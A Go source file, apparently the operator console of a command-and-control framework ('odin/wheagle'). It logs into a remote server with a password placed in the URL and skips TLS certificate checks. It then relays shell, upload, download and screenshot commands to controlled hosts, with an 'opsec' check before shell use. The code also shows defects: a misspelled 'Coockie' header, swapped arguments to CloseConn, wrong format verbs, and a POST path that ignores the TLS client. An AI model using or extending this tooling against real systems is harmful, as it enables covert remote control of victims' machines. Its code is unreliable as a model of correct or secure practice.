package cmd

import (
  "os"
  "fmt"
  "bytes"
  "bufio"
  "strings"
  "net/http"
  "io/ioutil"
  "crypto/tls"
  "odin/lib/utils"
  "github.com/spf13/cobra"
	"odin/wheagle/server/grpcapi"
)


var cmdAdminCli = &cobra.Command {
  Use: "im",
  Long: "Interact with a admin server",
	Run: func(cmd *cobra.Command, args []string){
    var err error
    id,err := cmd.Flags().GetString("id")
    if err != nil {
      utils.Logerror(fmt.Errorf("Mother Ship id can not be nill: %s",err));return
    }
    pass,err := cmd.Flags().GetString("pass")
    if err != nil {
      utils.Logerror(fmt.Errorf(" Password for Honey-badger can not be nill"));return
    }
    var (
      url string
      client *http.Client
      work *grpcapi.C2Command
    )
    work = new(grpcapi.C2Command)
    /// @TODO initialize connection (tcp or tls)
    cnct,err := Conns.GetConn(id)
    if err != nil{
      utils.Logerror(err);return
    }
    client = new(http.Client)
    if cnct.Tls {
      client = &http.Client{
  			Transport: &http.Transport{
  				TLSClientConfig: &tls.Config{
  					InsecureSkipVerify: true,
  				},
  			},
  		}
      url = fmt.Sprintf("https://%s",cnct.OAddress)
    } else {
      client = &http.Client{}
      url = fmt.Sprintf("http://%s",cnct.OAddress)
    }
    // register
    regUrl := fmt.Sprintf("%s/adminauth/?pass=%s",url,pass)
    req,err := http.NewRequest("GET",regUrl,nil)
    if err != nil{
      utils.Logerror(err);return
    }
    resp,err := client.Do(req)
    if err != nil{
      utils.Logerror(err);return
    }
    if resp.StatusCode != http.StatusOK {
  		utils.Notice(fmt.Sprintf("Server returned non-OK status code: %s", resp.StatusCode))
      body,err := ioutil.ReadAll(resp.Body)
      if err != nil {
        utils.Logerror(err);return
      }
      utils.Notice(string(body))
  		return
  	}
    cookie := resp.Header.Get("Coockie")
    resp.Body.Close()
    utils.Interactor(id,true)
    var iarg string
		reader := bufio.NewReader(os.Stdin)
    for {
      START:
      fmt.Printf("[ADMIN-INTERACTOR]: ")
			if iarg,err = reader.ReadString('\n'); err != nil{
				utils.Logerror(err)
				continue
			}
			iarg = strings.TrimSpace(iarg)
			if iarg == "" {goto START}
			ags := strings.Fields(iarg)
      switch ags[0]{
        case "shell":
          if err = GoodOpsec(); err != nil {
  					utils.Warning(fmt.Sprintf("%s",err))
  					goto END
  				}
        case "screenshot":
        case "upload":
        case "download":
        case "back":
          goto END
        default:
          work.In = iarg
          work,err = SendOutput(cookie,url,work)
          if err != nil {
            utils.Logerror(err);return
          }
          fmt.Println(work.Out)
      }
    }
    END:
      // close the connection
      if err := CloseConn(cookie,url); err != nil {
        utils.Logerror(err);return
      }
      utils.PrintInformation("Successfully logged out.")
      return
  },
}

var SendOutput = func(cookie, outUrl string, cmd *grpcapi.C2Command) (*grpcapi.C2Command,error) {
	data, err := grpcapi.OPWorkEncode(cmd)
	if err != nil {
		return nil,err
	}
	var count int
  BEGIN:
	req, err := http.NewRequest("POST", outUrl, bytes.NewReader(data))
	if err != nil {
    return nil,fmt.Errorf("Failed to create POST request: %s", err)
	}
	// Set the cookie in the request header
	req.Header.Set("Cookie", cookie)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
    return nil,fmt.Errorf("Failed to make POST request: %s", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		if count >= 3 {
      body,err := ioutil.ReadAll(resp.Body)
      if err != nil {
        return nil,fmt.Errorf("Error reading response body.: %q",err)
      }
      return nil,fmt.Errorf("Error sending output: %s with statuscode %s",string(body),resp.StatusCode)
		}
		count++
		goto BEGIN
	}
  body,err := ioutil.ReadAll(resp.Body)
  if err != nil {
    return nil,fmt.Errorf("Error reading body: %q",err)
  }
  work,err := grpcapi.OPWorkDecode(body)
  if err != nil {
    return nil,err
  }
	return work,nil
}

var CloseConn = func(url,cookie string) error {
  logoutUrl := fmt.Sprintf("%s/logout/?val=%s",url,"admin")
  req,err := http.NewRequest("GET",logoutUrl,nil)
  if err != nil {
    return err
  }
  req.Header.Set("Cookie", cookie)
  resp,err := http.DefaultClient.Do(req)
  if err != nil {
    return err
  }
  if resp.StatusCode != http.StatusOK {
    body,err := ioutil.ReadAll(resp.Body)
    if err != nil {
      return fmt.Errorf("Error reading body: %q",err)
    }
    return fmt.Errorf("Error loging out: %s",string(body))
  }
  return nil
}
